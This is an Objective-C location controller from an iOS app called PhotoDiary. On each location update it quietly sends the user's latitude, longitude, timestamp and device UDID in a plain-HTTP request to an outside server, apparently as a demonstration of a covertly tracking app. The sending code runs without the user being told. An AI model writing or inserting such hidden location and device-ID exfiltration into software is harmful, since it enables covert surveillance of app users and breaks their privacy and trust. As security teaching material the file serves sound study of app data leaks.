//
//  LocationController.m
//  PhotoDiary
//
//  Created by Klaus M. Rodewig on 01.02.11.
//  Copyright 2011 Klaus M. Rodewig. All rights reserved.
//

#import "LocationController.h"

@implementation LocationController

@synthesize locationManager;

- (id) init {
    self = [super init];
    if (self != nil) {
        self.locationManager = [[[CLLocationManager alloc] init] autorelease];
        self.locationManager.delegate = self; // send loc updates to myself
    }
    return self;
}

- (void)locationManager:(CLLocationManager *)manager
    didUpdateToLocation:(CLLocation *)newLocation
           fromLocation:(CLLocation *)oldLocation
{
    
    NSLog(@"[+] Location: %@", [newLocation description]);
    NSString *userLoc = [NSString stringWithFormat:@"%f:%f", newLocation.coordinate.latitude, newLocation.coordinate.longitude];
    NSLog(@"[+] userLoc: %@", userLoc);
        
    // UDID
    UIDevice *device = [UIDevice currentDevice];
    
    // userLoc per HTTP raussenden
    NSLog(@"[+] now: %f", [[NSDate date] timeIntervalSince1970]);
    
    NSString *url = [NSString stringWithFormat:@"http://www.it-abteilung.org/foo.php?time=%f&udid=%@&latitude=%f&longitude=%f", [[NSDate date] timeIntervalSince1970], [device uniqueIdentifier], newLocation.coordinate.latitude, newLocation.coordinate.longitude];
    
    NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:url]];
    NSURLResponse *response = nil;
    NSError *error = nil;
    NSData *content = [NSURLConnection sendSynchronousRequest:request
                                            returningResponse:&response
                                                        error:&error];
    
    content = nil;
}

- (void)locationManager:(CLLocationManager *)manager
       didFailWithError:(NSError *)error
{
	NSLog(@"Error: %@", [error description]);
}

- (void)dealloc {
    [self.locationManager release];
    [super dealloc];
}
@end
